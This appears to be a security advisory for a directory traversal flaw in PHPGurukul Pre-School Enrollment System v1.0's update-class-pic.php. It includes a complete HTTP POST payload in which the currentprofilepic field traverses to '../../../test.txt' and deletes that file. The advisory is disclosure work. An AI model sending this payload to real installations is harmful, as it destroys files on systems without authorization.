# PHPGurukul Pre-School Enrollment System Project directory traversal vulnerability-3(update-class-pic.php)

**PHPGurukul  Pre-School Enrollment System Project introduce**
   
   PHPGurukul Pre-School Enrollment System Project is a web-based pre-school enrollment system by PHPGurukul.   

**Vulnerability description**

   There is a security vulnerability in PHPGurukul Pre-School Enrollment System Project v1.0. The vulnerability is caused by  directory traversal vulnerability, which allows remote attackers to traverse directories and delete traversed files.

 PHPGurukul Project address

   
   https://phpgurukul.com/pre-school-enrollment-system-using-php-and-mysql/

   During the code audit, it was found that there was a problem with currentprofilepic in the update-class-pic.php file   
   ![1](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot2/1.png)   
   After analyzing the code, we tried to exploit the vulnerability
   
   **Loophole principle**
   
   Log in to the system backend management system
     
   ![2](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/2.png)
      
   Find the vulnerable functionality in the update-class-pic.php page, classes-manage-Edit Class-Update Class Pic-Update Teacher Profile Pic
  
   ![3](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot2/2.png)
   ![4](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot2/3.png)
   ![5](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot2/4.png)
  
   Intercept the data packet and find the problematic parameter currentprofilepic
   
   ![6](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot2/5.png)

   Transformed into attack payload    

    
    POST /Pre-School-Enrollment-System-PHP/preschool/admin/update-class-pic.php?cid=7 HTTP/1.1
    Host: localhost
    Cookie: PHPSESSID=qqnj1t0sdqqbv8qh5jrevaaln8
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywWObpfrtssMBATrx
    Accept-Language: zh-CN,zh;q=0.9
    Referer: http://localhost/Pre-School-Enrollment-System-PHP/preschool/admin/update-class-pic.php?cid=7
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Sec-Fetch-User: ?1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Origin: http://localhost
    sec-ch-ua-mobile: ?0
    sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
    sec-ch-ua-platform: "Windows"
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br, zstd
    Content-Length: 5637583

    ------WebKitFormBoundarywWObpfrtssMBATrx
    Content-Disposition: form-data; name="currentprofilepic"

    ../../../test.txt
    ------WebKitFormBoundarywWObpfrtssMBATrx
    Content-Disposition: form-data; name="teacherpic"; filename="804a28a9c5be300aafa9f83527956d13.jpeg"
    Content-Type: image/jpeg


    ------WebKitFormBoundarywWObpfrtssMBATrx
    Content-Disposition: form-data; name="submit"


    ------WebKitFormBoundarywWObpfrtssMBATrx--

   Create test.txt test file in  D:\phpstudy_pro\WWW\Pre-School-Enrollment-System-PHP
      ![7](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot2/7.png)

   Send payload, test.txt file has been deleted   
   ![8](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot2/8.png)   
   This directory traversal vulnerability can cause the traversed files to be deleted.

 **The affected version**   
 PHPGurukul Pre-School Enrollment System Project v1.0    
 Strictly validate and filter all paths entered by users to ensure that only specified files or directories are allowed to be accessed. Regular expressions can be used to restrict the path format.
 
   
